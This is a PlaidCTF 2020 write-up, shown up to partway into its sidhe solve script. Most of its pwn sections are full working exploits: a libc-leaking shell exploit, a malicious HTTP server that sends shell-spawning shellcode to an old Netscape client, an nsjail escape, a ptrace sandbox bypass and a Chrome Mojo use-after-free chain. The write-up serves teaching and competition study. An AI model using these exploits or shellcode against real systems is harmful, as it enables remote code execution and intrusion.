# PlaidCTF 2020 Writeup (A\*0\*E)

## Pwn

### Emoji DB
This is a classic menu challenge pwn which is related to wide char. We found three vulnerabilities in total:

* A UAF in the show emoji function. This could help us leak the libc base address.
* An index overflow when allocating a new buffer. This could result in an overflow on the bss segment. There's a log flag after four structures, we can enable it which will trigger the next vulnerability.
* We noticed that the command line to start the binary: `exec /home/ctf/emojidb 2>&-`. This line closes the `stderr` of the binary but the process will still use it if the flag enabled. Somehow this will lead to an inconsistency of `_IO_buf_base` and `_IO_write_base` in the `_wide_data` of `stderr`. The length check will always pass when trying to write in the buffer. So we could overflow the `_wide_data`. Luckily, there're wide char functions for `stdout` next to our buffer, so we could easily hijack the control flow.

#### exploit
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = "Kira / AAA"
from pwn import context, remote, process, asm, ELF, ROP
from pwn import p64, u64, p32, u32, flat
from pwn import pause, log, shellcraft
from subprocess import check_output
import sys

context.update(binary='./emojidb', terminal='zsh')
success = lambda *args: log.success(' '.join(hex(i) if isinstance(i, int) else str(i) for i in args))
leak_ptr = lambda: u64(p.recv(6).ljust(8, '\0'))
e = ELF('./emojidb')
p = None
_remote = False


input_indictor = "\x86\x93\xf0\x9f\x9b\x91\xe2\x9d\x93"
size_indictor = "\xf0\x9f\x93\x8f\xe2\x9d\x93"
idx_indictor = "\xf0\x9f\x94\xa2\xe2\x9d\x93"
alloc_op = p64(0x1f195)
delete_op = p64(0x1f193)
show_op = p64(0x1f4d6)


def alloc(size, content):
    p.sendafter(input_indictor, u'\U0001f195'.encode("utf-8"))
    p.sendafter(size_indictor, str(size))
    if size * 4 - 4 == len(content):
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    p.sendafter(input_indictor, u'\U0001f193'.encode("utf-8"))
    p.sendlineafter(idx_indictor, str(idx))


def show(idx):
    p.sendlineafter(input_indictor, u'\U0001f4d6'.encode("utf-8"))
    p.sendlineafter(idx_indictor, str(idx))


def get_utf8(c):
    out = check_output("echo '{}' | ./convert2".format(c), shell=True)
    return out


def write64(num):
    p.sendafter(input_indictor, get_utf8(num & 0xffffffff))
    p.sendafter(input_indictor, get_utf8((num >> 32) & 0xffffffff))


# Let the hunt begin.
def exploit(host='', port=1337):
    global p, _remote
    if _remote:
        p = remote(host, port)
    else:
        p = process('./emojidb', env={'LD_PRELOAD': ''})
    l = ELF('./libc.so.6')

    context.log_level = 'debug'
    alloc(0x18a, u"\U0001f195".encode("utf-8") * 0x19)  # 1
    alloc(0x18a, u"\U0001f195".encode("utf-8") * 0x19)  # 2
    alloc(0x18a, u"\U0001f195".encode("utf-8") * 0x19)  # 3
    alloc(0x18a, u"\U0001f195".encode("utf-8") * 0x19)  # 4
    alloc(0x18a, u"\U0001f195".encode("utf-8") * 0x19)  # 5
    delete(1)
    delete(3)

    show(1)
    msg = ""
    while len(msg) < 9:
        msg += p.recv(1)
    if msg[0] == "?":
        print("[Error] libc addr got ?")
        sys.exit(1)

    libc_base = int(check_output("echo '{}' | ./convert1".format(msg[:6]), shell=True), 16)
    libc_base |= int(check_output("echo '{}' | ./convert1".format(msg[6:9]), shell=True), 16) << 32
    libc_base -= 0x3ec110
    l.address = libc_base

    success("libc base: 0x{:x}".format(libc_base))

    for i in range(9):
        p.sendafter(input_indictor, 'A')
    wide_data = libc_base + 0x3eb9e8
    write64(wide_data)
    write64(wide_data)
    write64(wide_data)
    write64(wide_data)

    write64(libc_base + 0x3eb9ec)
    for i in range(5):
        p.sendafter(input_indictor, '\0')
        p.sendafter(input_indictor, '\0')

    # pause()
    write64(u64('/bin/sh\0'))
    write64(l.sym['system'])

    p.interactive()


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'r':  # remote
        _remote = True
    exploit('emojidb.pwni.ng', 9876)
    # exploit('127.0.0.1', 1337)
```

```C
// convert1.c
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <locale.h>

int main() {
    setlocale(0, "en_US.UTF-8");
    unsigned long long val = 0;

    wscanf(L"%lc", &val);
    printf("%x", (void *)val);
    return 0;
}
```

```C
// convert2.c
#include <stdio.h>
#include <wchar.h>
#include <string.h>
#include <locale.h>

int main() {
    setlocale(0, "en_US.UTF-8");
    wchar_t sentence[256] = {0};
    unsigned int n = 0;

    scanf("%u", &n);
    memcpy(sentence, &n, 4);
    fputws(sentence, stdout);
    return 0;
}
```

### Back to the Future
We need to pwn the Netscape 0.96 Beta developed back in 1994.

The binary is old school `a.out` format, which is not supported by default on modern linux systems. With some efforts we managed to run it on old Ubuntu (4.10-7.10).

We noticed some stack buffer overflows in the code processing HTTP headers.

We create an first exploit by jumping to the shellcode on stack and make a successful test locally. But we failed to get a shell remotely. After a lot of tests and attempts, we found out that the stack is not executable on remote machine.

We also noticed that `text` segment is writable (and executable ofc) on both local and remote machine. Finally we make a ROP based exploit which first puts shellcode into `text` segment by ROP, then executes it to spawn a shell.

#### exploit
```python
#!/usr/bin/env python
# encoding: utf-8

#PCTF{ELFs?__wH3Re_wER3_G01ng___We_d0Nt_n3ed_ELFs__344bc53072811af0}

import time
from pwn import remote, process, server, ELF
from pwn import context
from pwn import p32,p64,u32,u64,asm

context(arch='i386', os='linux', log_level='info')
r = None

def exploit():
    global r
    port = 1337
    s = server(port)

    #raw_input('wait to start')
    r = s.next_connection()

    sc = asm(open('sc.s').read())

    loop = 0x60011824
    xchg_eax_ebx = 0x600311f1   # xchg eax, ebx ; cld ; cld ; inc dword ptr [ecx] ; ret
    pop_ebx = 0x600426a4    # pop ebx ; add al, 0x83 ; ret
    pop_ecx = 0x60055b4b    # pop ecx ; test eax, 0xc483fffa ; add al, 0x83 ; ret
    pop_ebp = 0x6003A938
    add_eax_8 = 0x6003a930  # add eax, 8 ; push eax ; call ecx; mov esp, ebp; pop ebp; ret
    libc_read = 0x60028D90
    libc_write = 0x60033398
    base_stage = 0x5ffff880

    rop = p32(pop_ebp) + p32(base_stage)
    rop += p32(pop_ebx) + p32((4-8-0x83)&0xffffffff)
    rop += p32(xchg_eax_ebx)
    rop += p32(pop_ecx) + p32(libc_read)
    rop += p32(add_eax_8) + p32(base_stage) + p32(0x7fffffff)
    p = 'A'*(0x200-0xd8) + rop
    assert('\0' not in p)
    assert(' ' not in p)
    assert('\t' not in p)
    assert('\n' not in p)
    assert('\x0b' not in p)
    assert('\x0c' not in p)
    assert('\x0d' not in p)

    resp = 'HTTP/1.0 200 OK\n'
    resp += 'EXPIRES: a %s b\n\n' % (p)
    r.recvuntil('\r\n\r\n')

    rop2 = p32(0) + p32(base_stage+8) + sc
    resp = resp.ljust(260+1024) + rop2
    r.send(resp)

if __name__ == '__main__':
    exploit()
    r.interactive()
```

```asm
.intel_syntax noprefix
.code32

.global _start
_start:
push 4
pop ebx
push 2
pop ecx
dup_label:
push 0x3f
pop eax
int 0x80
dec ecx
jns dup_label
cdq
push edx
push 0x68732f6e
push 0x69622f2f
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,0xb
int 0x80
```

### ipppc
`connman` and `jailed` are communicated through socket, and they use [FD passing mechanism](https://sumitomohiko.wordpress.com/2015/09/24/file-descriptor-passing-with-sendmsg2-and-recvmsg2-over-unix-domain-socket/). We are supposed to pwned `jailed` program and use this fd passing mechanism to read the flag outside the `nsjail` environment.
#### Vulnerability of jailed
`jailed` is a simple http client to fetch contents from remote server, the vulnerability is located at where it parse the html content. This logic will skip anything between `<` and `>`, so we can create a heap overflow.
![vul1](https://hackmd.sinku.me/uploads/upload_c2ed723cea93f65622a80dd5b7488878.png)
We can arrange the heap layout and use this heap overflow to attack tcache, then we got a chance of arbitrary write. Because the `jailed` binary is static and without PIE, we can write `__free_hook` to hijack the control flow. When it triggers the `__free_hook`, `rcx` points to a heap address where we can control, so we can use a gadget `0x00000000004ffde6: mov rsp, rcx; ret;` to do stack pivot. Then we use rop chain to finish two jobs:
1. copy the shellcode from the response to .bss
2. use mprotect to make the shellcode `rwx`

#### Vulnerability of connman
`connman` can receive the hostname from `jailed` and create a socket for it. The bug is when it send back a new fd to `jailed`: `sendfd` is `char`, so when the `newfd>255`, it will send some previous opend fd to `jailed`. At the begining of connman, it open `/workdir` at fd `4`, so we can force it create a lot of fd and then when `newfd=260`, we can receive the `fd` of `/workdir` inside the `jailed`. 
![vul2](https://hackmd.sinku.me/uploads/upload_ee6dec4143b1971fb36f322eec3c9079.png)

With the `fd` of `/workdir`, we can use `openat` to read the flag easily, the last step is send it back to `connman` as a display message.

#### pwn_server.py
```python
from pwn import *

END = "\r\n\r\n"
TEMP = END + "%s" + END
context.arch = "amd64"

s = server(80)

def make_links(link_list, rest=None):
    temp = ""
    for link in link_list:
        temp += "href=\"%s\"\n" % link
    if rest:
        temp += rest
    return TEMP % temp

def recv_and_send(content, bp=False):
    p = s.next_connection()
    p.recvuntil(END)
    if bp:
        raw_input("bp")
    p.sendline(content)
    p.close()

def bp():
    raw_input("bp")


free_hook = 0x762798

html1 = make_links(["a"*0x10, "b"*0x10, "c"*0x10])
recv_and_send(html1)
html2 = make_links(["A"*0x80], ">" + cyclic(22) + p64(free_hook-0x7d) +"<>")
recv_and_send(html2)

for i in range(0x1):
    html2 = TEMP % ("A" * (0x10-9))
    recv_and_send(html2) 

html2 = TEMP % ("A" * (0x80-10) + "<")
recv_and_send(html2)


html3 = make_links(["x"*0x20])
recv_and_send(html3)

sc = asm("mov rdi, 0x73f110; mov rdi, [rdi]; mov rsi, 2; mov rdx, 3;")
sc += open("sc.bin", "r").read()[0x63a: 0xaea] 

# 0x00000000004ffde6: mov rsp, rcx; ret;
gadget = 0x4ffde6 
payload = "A"*0x7d + p32(gadget)[:-1]
html2 = "HTTP/1.1 301Location: " + payload.ljust(0x80) + END 
html2 = html2.ljust(0xa0) + sc

recv_and_send(html2, True)
```

#### exp.py
```python
#pctf{better_than_those_python_sandbox_escape_problems}
from pwn import *
from subprocess import check_output

p = remote("ipppc.pwni.ng", 6996)

chal = p.recvline()
p.info(chal)
output = check_output(["hashcash", "-mqb28", chal])
p.sendline(output.strip())

mprotect = 0x4a33a0
memcpy = 0x400468
pop_rdi = 0x00000000004006c6 #: pop rdi; ret; 
pop_rdx_rsi =  0x00000000004a4e49 #: pop rdx; pop rsi; ret; 
xchg_edi_esi = 0x0000000000512a85 #: xchg edi, esi; jmp rax; 
pop_rax = 0x00000000004a257c #: pop rax; ret; 

rop = ""
rop += p64(pop_rax)
rop += p64(memcpy)
rop += p64(pop_rdx_rsi)
rop += p64(0x1000)
rop += p64(0x762000)
rop += p64(xchg_edi_esi)
# mprotect
rop += p64(pop_rdi)
rop += p64(0x762000)
rop += p64(pop_rdx_rsi)
rop += p64(7)
rop += p64(0x1000)
rop += p64(mprotect)
rop += p64(0x7620a0)

p.sendlineafter("url?", "http://127.0.0.1")
p.sendlineafter("str?", rop)

p.interactive()
```
#### shellcode.c
```c
// gcc shellcode.c -o sc.bin -masm=intel -fPIC -pie -fno-stack-protector
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>

#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <unistd.h>
#include <sys/syscall.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int entry_point(int fd, int valid_fd, int output_fd){
	return my_exp(fd, valid_fd, output_fd);
}

void you_know_what() {
	asm volatile(
			"my_syscall:"
			"mov     rax, rdi;\n"
			"mov     rdi, rsi;\n"
			"mov     rsi, rdx;\n"
			"mov     rdx, rcx;\n"
			"mov     r10, r8;\n"
			"mov     r8, r9;\n"
			"syscall;\n"
			"ret;\n"
	   );
}
ssize_t my_recvmsg(int sockfd, struct msghdr *msg, int flags) {
	return my_syscall(SYS_recvmsg, sockfd, msg, flags);
}
ssize_t my_sendmsg(int sockfd, const struct msghdr *msg, int flags) {
	return my_syscall(SYS_sendmsg, sockfd, msg, flags);
}

ssize_t my_close(int fd) {
	return my_syscall(SYS_close, fd);
}

int my_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
	return my_syscall(SYS_openat, dirfd, pathname, flags, mode);
}

ssize_t my_read(int fd, void *buf, size_t count) {
	return my_syscall(SYS_read, fd, buf, count);
}
ssize_t my_write(int fd, void *buf, size_t count) {
	return my_syscall(SYS_write, fd, buf, count);
}



int my_exp(int fd, int valid_fd, int output_fd){
	struct msghdr msg;
	char data[1024];
	struct iovec vec;

	char data2[1024];
	msg.msg_name = NULL;
	msg.msg_namelen = 0;
	msg.msg_iov = &vec;
	vec.iov_base = data2;
	vec.iov_len = sizeof(data);
	msg.msg_iovlen = 1;
	msg.msg_control = data;
	msg.msg_controllen = 20;
	// my_recvmsg(fd, &msg, 0);
	struct cmsghdr * hh = data;
	msg.msg_iovlen = 1;
	vec.iov_base = data2;
	vec.iov_len = sizeof(data2);
	msg.msg_control = data;
	msg.msg_controllen = 20;
	// my_recvmsg(fd, &msg, 0);
	//close(*(int*)hh->__cmsg_data);

	for (int i = 0; i < 260-8; i++) {
	msg.msg_iovlen = 1;
	data2[0] = 1;
	data2[1] = '\x00';
	data2[2] = '\x00';
	data2[3] = '\x00';
	data2[4] = '\x00';
	data2[5] = '\x00';
	data2[6] = '\x00';
	data2[7] = '\x00';
	data2[8] = '\x00';
	vec.iov_base = data2;
	vec.iov_len = 9;
	hh->cmsg_level = SOL_SOCKET;
	hh->cmsg_type = 1;
	hh->cmsg_len = 20LL;
	*(int*)hh->__cmsg_data = valid_fd;
	msg.msg_controllen = 20;
	my_sendmsg(fd, &msg, 0);


	msg.msg_control = data;
	msg.msg_controllen = 200;
	my_recvmsg(fd, &msg, 0);
	my_close(*(int*)hh->__cmsg_data);
	}

	msg.msg_iovlen = 1;
	data2[0] = 1;
	data2[1] = '\xc5';
	data2[2] = '\x25';
	data2[3] = '\x00';
	data2[4] = '\x00';
	data2[5] = '\x00';
	data2[6] = '\x00';
	data2[7] = '\x00';
	data2[8] = '\x00';
	vec.iov_base = data2;
	vec.iov_len = 9;
	hh->cmsg_level = SOL_SOCKET;
	hh->cmsg_type = 1;
	hh->cmsg_len = 20LL;
	*(int*)hh->__cmsg_data = valid_fd;
	msg.msg_controllen = 20;
	my_sendmsg(fd, &msg, 0);

	msg.msg_control = data;
	msg.msg_controllen = 200;
	my_recvmsg(fd, &msg, 0);
	int leaked_fd = *(int*)hh->__cmsg_data;
	char flagname[5] = "flag";
	int flag_fd = my_openat(leaked_fd, flagname, O_RDONLY, 0);
	char buf[1024];
	int len = my_read(flag_fd, buf, 1024);

	msg.msg_iovlen = 1;
	buf[0] = 3;
	vec.iov_base = buf;
	vec.iov_len = 100;
	msg.msg_controllen = 0;
	msg.msg_control = 0;
	my_sendmsg(fd, &msg, 0);

}
int main(int argc, char **argv) {
	int fd = atoi(argv[1]);
	my_exp(fd, 0, 1);

}
```

### sandybox
A ptrace based sandbox allows a few syscalls in a whitelist by checking the syscall number in `rax`.

We can use legacy i386 syscall `int 0x80` to bypass it.

`open` in i386 is 5, the same as `fstat` in x86_64 which is in the whitelist.

Be aware that i386 syscall only accepts lower 32 bits of a pointer. We need to use `mmap` to get a buffer in the lower 4GB memory for the first argument of `open`.

#### exploit
```C
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

void _start()
{
    char *addr = (char*)mmap((void*)0x1234000, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    __builtin_strcpy(addr, "./flag");
    int fd = open(addr, O_RDONLY);
    char buf[0x80];
    int ret = read(fd, buf, 0x80);
    write(1, buf, ret);
    _exit(0);
}
```

```asm
.intel_syntax noprefix
.code64

.global read
read:
    xor eax,eax
    syscall
    ret

.global write
write:
    mov eax,1
    syscall
    ret

.global open
open:
    mov eax,5
    mov ebx,edi
    mov ecx,esi
    int 0x80
    ret

.global _exit
_exit:
    mov eax,60
    syscall

.global mmap
mmap:
    mov r10,rcx
    mov eax,9
    syscall
    ret
```

### mojo

There are two bugs in this challenge. The first one is OOB Read which can be used for infoleak, while the second one is a use-after-free which is very similar to issue/977462.

So the exploit is not complicated:

1. leak virtual table and heap address
2. destroy RFHI
3. spray something to fill the hole
4. trigger use-after-free in `storeData` or `getData`
5. find a stack pivot to do ROP(NIGHTMARE!!!)
6. put everything into a single html

```html
<html>
    <script src="../mojo/public/js/mojo_bindings.js"></script>
    <script src="../third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
    <script src="../third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
    <script type="text/javascript">
TextDecoder.prototype.decode = function(a) {
    let s = "";
    for (let c of a) {
        s += String.fromCharCode(c);
    }
    return s;
}

TextEncoder.prototype.encode = function(s) {
    let uint8Array = new Uint8Array(s.length);
    for (let i = 0; i < s.length; i++) {
        uint8Array[i] = s.charCodeAt(i);
    }
    return uint8Array;
}
    </script>
    <body>
    <h1> Parent Frame </h1>
  </body>
  <script>
let plaid_arr = [];
let N = 256;
const kAllocationCount = 0x300;
const kRenderFrameHostImplSize = 0xc28;
let t_ab = new ArrayBuffer(0x8);
let t_u64 = new BigUint64Array(t_ab);
let t_u8 = new Uint8Array(t_ab);
let leak_name = "\xff\xff\xff\xff\xff\xff\xff\xff";
let vfunc, chrome_base;
let poprsi = 0x504d645n;
let poprdx = 0x50b3fden;
let execve = 0x9eff010n;
let execv = execve + 0x10n;
let rdirsi = 0x303431dn;
let poprbp = 0x504d9d0n;
let poprax = 0x5062d6bn;

function Allocation(size=0x148) {
    function ProgressClient() {
        function ProgressClientImpl() {
        }

        ProgressClientImpl.prototype = {
            onProgress: async (arg0) => {
            }
        };

        var progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
        var progress_client_req = mojo.makeRequest(progress_client_ptr);
        var progress_client_binding = new mojo.AssociatedBinding(
            blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

        return progress_client_ptr;
    }

    this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
    this.serialized_blob = blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());

    this.malloc = function(data) {
        this.pipe.producer.writeData(data);
        this.pipe.producer.close();
    }

    this.free = function() {
        this.serialized_blob.blob.ptr.reset();
    }

    return this;
}

function hex(n) {
    return "0x"+n.toString(16);
}

async function infoleak() {
    let data = new Array(5*8);

    for (let i = 0; i < data.length; i++) {
        data[i] = i;
    }

    for (let i = 0; i < N; i++) {
        plaid_arr[i] = new blink.mojom.PlaidStorePtr();
        Mojo.bindInterface(blink.mojom.PlaidStore.name,
            mojo.makeRequest(plaid_arr[i]).handle, "context", true);
        plaid_arr[i].storeData(leak_name, data);
    }

    function search_vtbl_impl(data) {
        let vtbl = 0;
        for (let i = 0; i < data.length; i += 8) {
            let x = data[i];
            if (x == 0xa0) {
                let y = data[i+1];
                if ((y & 0xf) == 0x7) {
                    for (let j = 0; j < 8; j++) {
                        t_u8[j] = data[i+j];
                    }
                    vtbl = t_u64[0];
                    return [vtbl, i];
                }
            }
        }
        return [0, 0]
    }

    async function search_vtbl() {
        for (let i = N/4; i < N; i++) {
            let leak_obj = await plaid_arr[i].getData(leak_name, 5000);
            let leak_data = leak_obj['data'];
            let [vtbl, offset] = search_vtbl_impl(leak_data);
            if (vtbl) {
                return [i, offset, vtbl];
            }
        }
        alert("Not found");
        window.close();
        exit();
    }

    let [leak_idx, offset, vtbl] = await search_vtbl();
    chrome_base = vtbl - 0x9fb67a0n;
    t_u64[0] = chrome_base + 0x58a32f8n;
    decoder = new TextDecoder();
    let name = decoder.decode(t_u8);
    for (let i = 0; i < N; i++) {
        plaid_arr[i].storeData(name, [1]);
    }
    let leak_obj = await plaid_arr[leak_idx].getData(leak_name, 5000);
    let leak_data = leak_obj['data'];
    for (let j = 0; j < 8; j++) {
        t_u8[j] = leak_data[offset+0x10+j];
    }
    vfunc = t_u64[0] + 0x20n - 0x160n;
}

function allocate_rfh(src) {
    var iframe = document.createElement("iframe");
    iframe.srcdoc = `<script src="../mojo/public/js/mojo_bindings.js"><\/script>
    <script src="../third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"><\/script>
    <script src="../third_party/blink/public/mojom/blob/blob_registry.mojom.js"><\/script><script>let plaid_store_ptr = new blink.mojom.PlaidStorePtr();Mojo.bindInterface(blink.mojom.PlaidStore.name,mojo.makeRequest(plaid_store_ptr).handle, "context", true);window.plaid_store_ptr = plaid_store_ptr;<\/script>`;
    document.body.appendChild(iframe);
    return iframe;
}

function deallocate_rfh(iframe) {
    document.body.removeChild(iframe);
}

function trigger_uaf() {
    // allocate RFH
    var frame = allocate_rfh();
    frame.onload = _ => {
        var blobs = new Array(0x1000);
        plaid_store_ptr = frame.contentWindow.plaid_store_ptr;
        plaid_store_ptr.getData("aaa", 1);
        deallocate_rfh(frame);
        w64(ab1, 0, vfunc);
        w64(ab1, 0x08, chrome_base+poprax);
        w64(ab1, 0x10, chrome_base+poprbp);
        w64(ab1, 0x18, chrome_base+rdirsi);
        w64(ab1, 0x20, chrome_base+poprdx);
        w64(ab1, 0x28, 0);
        w64(ab1, 0x30, chrome_base+poprsi);
        w64(ab1, 0x38, 0);
        w64(ab1, 0x40, chrome_base+execve);
        w64(ab1, 0x48, chrome_base+0x507634cn);
        for (let i = 0; i < plaid_arr.length; i++) {
            plaid_arr[i].storeData("AAA", new Uint8Array(ab1));
        }
        for (var i = 0; i < kAllocationCount; i++) {
            heap[i].malloc(ab1);
        }
        plaid_store_ptr.getData("./flag_printer", 1);
    }
}
function w64(ab, offset, value) {
let u64 = new BigUint64Array(ab);
    u64[offset/8] = BigInt(value);
}
async function main() {
    ab1 = new ArrayBuffer(kRenderFrameHostImplSize);
    w64(ab1, 0x00, 0x41414141);

    heap = new Array(kAllocationCount);
    blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
    Mojo.bindInterface(blink.mojom.BlobRegistry.name, mojo.makeRequest(blob_registry_ptr).handle, "process");
    for (let i = 0; i < kAllocationCount; ++i) {
        heap[i] = new Allocation(kRenderFrameHostImplSize);
    }
    await infoleak();
    trigger_uaf();
}
main();
  </script>
</html>
```

## Crypto

### stegasaurus scratch

In this challenge we are supposed to write lua script for Alice and Bob to transfer messages. 

For task1, we are given 8 numbers from `1..40000`, and Alice should discard one of them, deliver others to Bob with arbitrary orders, while make it possible for Bob to guess the discarded one. Since `7!=5040 < 40000`, there is not enough information inside the order itself. We choose to encode `discarded_number/8` with the order. With that value Bob is likely to deduce `nth` largest number has been discarded. Alice can choose `n` with xor of all numbers modulu 8 so that Bob can recover it with any seven number and `n`

This strategy may fail when two numbers collision after dividing by 8. We add a check for Bob and if inconsistent we use `n+1` instead of `n`. There is still small probability of failure but enough for 10000 tests

And task2 is much easier. We can use `0` to mark how many `1` behind is actually `2`. You can refer to the lua script below

```
function Alice1(a)
    table.sort(a)
    f={}
    f[1]=1
    for i=2,7 do f[i]=f[i-1]*i end
    choose=0
    for i=1,8 do choose=choose~(a[i]%8) end
    choose=choose+1
    val=a[choose]//8
    for j=choose+1,8 do a[j-1]=a[j] end
    for i=1,6
    do
        x=val//f[7-i]
        val=val%f[7-i]
        tmp=a[x+i]
        for j=x+i,i+1,-1 do a[j]=a[j-1] end
        a[i]=tmp
    end
    return {a[1],a[2],a[3],a[4],a[5],a[6],a[7]}
end
function Bob1(a)
    aa = {a[1],a[2],a[3],a[4],a[5],a[6],a[7]}
    table.sort(aa)
    f={}
    f[1]=1
    for i=2,7 do f[i]=f[i-1]*i end
    val = 0
    for i=1,6
    do
        j=1
        while (j<8-i and aa[j]~=a[i]) do j=j+1 end
        for k=j+1,8-i do aa[k-1]=aa[k] end
        val = val+f[7-i]*(j-1)
    end
    val = val*8
    last=0
    for i=1,7 do last=last~(a[i]%8) end
    aa = {a[1],a[2],a[3],a[4],a[5],a[6],a[7],val}
    table.sort(aa)
    choose=1
    while (aa[choose]~=val) do choose=choose+1 end
    choose=choose-1
    last=last~choose

    aa = {a[1],a[2],a[3],a[4],a[5],a[6],a[7],val+last}
    table.sort(aa)
    if (aa[choose+1]~=val+last)
    then
        last=last~choose
        choose=choose+1
        last=last~choose
    end
    return val+last
end

function Alice2(t)
    i = 1
    ret = {}
    while i<=96 do
        if t[i] == 2 then
            j = i - 1
            if j == 0 then j = 96 end
            while t[j] ~= 1 do
                j = j - 1
                if j == 0 then j = 96 end
            end
            t[j] = 0
            table.insert(ret, j)
        end
        i = i + 1
    end
    return ret
end

function Bob2(t)
    i = 1
    ret = {}
    while i<=96 do
        if t[i] == 0 then
            j = i + 1
            if j == 97 then j = 1 end
            while t[j] ~= 1 do
                j = j + 1
                if j == 97 then j = 1 end
            end
            t[j] = 2
            table.insert(ret, j)
        end
        i = i + 1
    end
    return ret
end
```

and the python one
```
from pwn import *

context.log_level='debug'

c = remote('stegasaurus.pwni.ng', 1337)
#c = process('./stegasaurus')

p = process(['/usr/bin/hashcash', '-b', '25', '-m', '-r', 'stegasaurus'])
p.recvuntil('token: ')
x = p.recv()
c.sendlineafter('> ', x)

with open('ans.lua') as f:
    cont = f.read()

c.sendafter('file\n',cont)
#c.stdin.close()
c.shutdown('write')

c.interactive()
```

### sidhe

This challenge implements supersingular isogeny key exchange, and we should acquire the private key with less than 300 exchanges. After reading some tutorials we notice the so-called GPST attacks can be used. (in fact only few candidate attacks for SIDH) There is one implementation for 2-isogeny and we shall modify it for 3-isogeny case in this server

The solve.sage.py file is below

```
# This file was *autogenerated* from the file solve.sage
from sage.all_cmdline import *   # import sage library

_sage_const_0xD8 = Integer(0xD8); _sage_const_0x89 = Integer(0x89); _sage_const_2 = Integer(2); _sage_const_3 = Integer(3); _sage_const_1 = Integer(1); _sage_const_0 = Integer(0); _sage_const_6 = Integer(6); _sage_const_0x00003CCFC5E1F050030363E6920A0F7A4C6C71E63DE63A0E6475AF621995705F7C84500CB2BB61E950E19EAB8661D25C4A50ED279646CB48 = Integer(0x00003CCFC5E1F050030363E6920A0F7A4C6C71E63DE63A0E6475AF621995705F7C84500CB2BB61E950E19EAB8661D25C4A50ED279646CB48); _sage_const_0x0001AD1C1CAE7840EDDA6D8A924520F60E573D3B9DFAC6D189941CB22326D284A8816CC4249410FE80D68047D823C97D705246F869E3EA50 = Integer(0x0001AD1C1CAE7840EDDA6D8A924520F60E573D3B9DFAC6D189941CB22326D284A8816CC4249410FE80D68047D823C97D705246F869E3EA50); _sage_const_0x0001AB066B84949582E3F66688452B9255E72A017C45B148D719D9A63CDB7BE6F48C812E33B68161D5AB3A0A36906F04A6A6957E6F4FB2E0 = Integer(0x0001AB066B84949582E3F66688452B9255E72A017C45B148D719D9A63CDB7BE6F48C812E33B68161D5AB3A0A36906F04A6A6957E6F4FB2E0); _sage_const_0x0000FD87F67EA576CE97FF65BF9F4F7688C4C752DCE9F8BD2B36AD66E04249AAF8337C01E6E4E1A844267BA1A1887B433729E1DD90C7DD2F = Integer(0x0000FD87F67EA576CE97FF65BF9F4F7688C4C752DCE9F8BD2B36AD66E04249AAF8337C01E6E4E1A844267BA1A1887B433729E1DD90C7DD2F); _sage_const_0x0000C7461738340EFCF09CE388F666EB38F7F3AFD42DC0B664D9F461F31AA2EDC6B4AB71BD42F4D7C058E13F64B237EF7DDD2ABC0DEB0C6C = Integer(0x0000C7461738340EFCF09CE388F666EB38F7F3AFD42DC0B664D9F461F31AA2EDC6B4AB71BD42F4D7C058E13F64B237EF7DDD2ABC0DEB0C6C); _sage_const_0x000025DE37157F50D75D320DD0682AB4A67E471586FBC2D31AA32E6957FA2B2614C4CD40A1E27283EAAF4272AE517847197432E2D61C85F5 = Integer(0x000025DE37157F50D75D320DD0682AB4A67E471586FBC2D31AA32E6957FA2B2614C4CD40A1E27283EAAF4272AE517847197432E2D61C85F5); _sage_const_0x0001D407B70B01E4AEE172EDF491F4EF32144F03F5E054CEF9FDE5A35EFA3642A11817905ED0D4F193F31124264924A5F64EFE14B6EC97E5 = Integer(0x0001D407B70B01E4AEE172EDF491F4EF32144F03F5E054CEF9FDE5A35EFA3642A11817905ED0D4F193F31124264924A5F64EFE14B6EC97E5); _sage_const_0x0000E7DEC8C32F50A4E735A839DCDB89FE0763A184C525F7B7D0EBC0E84E9D83E9AC53A572A25D19E1464B509D97272AE761657B4765B3D6 = Integer(0x0000E7DEC8C32F50A4E735A839DCDB89FE0763A184C525F7B7D0EBC0E84E9D83E9AC53A572A25D19E1464B509D97272AE761657B4765B3D6); _sage_const_0x00008664865EA7D816F03B31E223C26D406A2C6CD0C3D667466056AAE85895EC37368BFC009DFAFCB3D97E639F65E9E45F46573B0637B7A9 = Integer(0x00008664865EA7D816F03B31E223C26D406A2C6CD0C3D667466056AAE85895EC37368BFC009DFAFCB3D97E639F65E9E45F46573B0637B7A9); _sage_const_0x00000000 = Integer(0x00000000); _sage_const_0x00006AE515593E73976091978DFBD70BDA0DD6BCAEEBFDD4FB1E748DDD9ED3FDCF679726C67A3B2CC12B39805B32B612E058A4280764443B = Integer(0x00006AE515593E73976091978DFBD70BDA0DD6BCAEEBFDD4FB1E748DDD9ED3FDCF679726C67A3B2CC12B39805B32B612E058A4280764443B); _sage_const_0x00012E84D7652558E694BF84C1FBDAAF99B83B4266C32EC65B10457BCAF94C63EB063681E8B1E7398C0B241C19B9665FDB9E1406DA3D3846 = Integer(0x00012E84D7652558E694BF84C1FBDAAF99B83B4266C32EC65B10457BCAF94C63EB063681E8B1E7398C0B241C19B9665FDB9E1406DA3D3846); _sage_const_0x0000EBAAA6C731271673BEECE467FD5ED9CC29AB564BDED7BDEAA86DD1E0FDDF399EDCC9B49C829EF53C7D7A35C3A0745D73C424FB4A5FD2 = Integer(0x0000EBAAA6C731271673BEECE467FD5ED9CC29AB564BDED7BDEAA86DD1E0FDDF399EDCC9B49C829EF53C7D7A35C3A0745D73C424FB4A5FD2); 